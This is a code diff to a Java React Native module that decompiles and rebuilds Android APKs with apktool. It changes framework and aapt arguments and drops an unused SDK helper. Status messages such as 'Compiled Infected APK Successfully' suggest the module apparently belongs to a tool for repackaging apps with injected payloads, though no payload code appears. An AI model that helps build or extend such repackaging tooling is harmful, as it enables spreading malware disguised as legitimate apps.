@@ -264,7 +264,8 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         WritableMap params = Arguments.createMap();
         params.putString("message", "[+] Decompiled Successfully !");
         try {
-            Main.main(new String[]{"d", "-r","-f", targetApkPath , "-o", working_dir+"normal_apk", });
+            String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
+            Main.main(new String[]{"d", "-p", framework, "-f", targetApkPath , "-o", working_dir+"normal_apk", });
             promise.resolve(params);
         } catch (Exception e) {
             e.printStackTrace();
@@ -322,7 +323,8 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         WritableMap params = Arguments.createMap();
         params.putString("message", "[+] Compiled Infected APK Successfully !");
         try {
-            Main.main(new String[]{"b", working_dir+"normal_apk", "-o", working_dir+"unsigned.apk", });
+            String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
+            Main.main(new String[]{"b","-a", getAapt(),"-p", framework, working_dir+"normal_apk", "-o", working_dir+"unsigned.apk", });
             promise.resolve(params);
         } catch (Exception e) {
             e.printStackTrace();
@@ -556,8 +558,7 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
             else populateFilesList(file);
         }
     }
-    private File getAaptFile() throws IOException {
-        copyAssets(reactContext.getAssets(), "sdk", reactContext.getFilesDir());
+    private String getAapt() throws IOException {
         copyAssets(reactContext.getAssets(), "bin", reactContext.getFilesDir());
         File[] binFiles = new File(reactContext.getFilesDir(), "bin").listFiles();
         for (File binFile : binFiles) {
@@ -584,7 +585,7 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
                 }
                 break;
         }
-        return new File(reactContext.getFilesDir(), "bin/"+aaptName);
+        return new File(reactContext.getFilesDir(), "bin/"+aaptName).getAbsolutePath();
     }
     public static void copyAssets(AssetManager assets, String assetPath, File destFolder) throws IOException {
         String[] childs = assets.list(assetPath);
@@ -611,7 +612,5 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         input.close();
         output.close();
     }
-    public static File getClasspathFile(ReactContext context) {
-        return new File(context.getFilesDir(),"sdk/platforms/android-27/android.jar");
-    }
+
 }
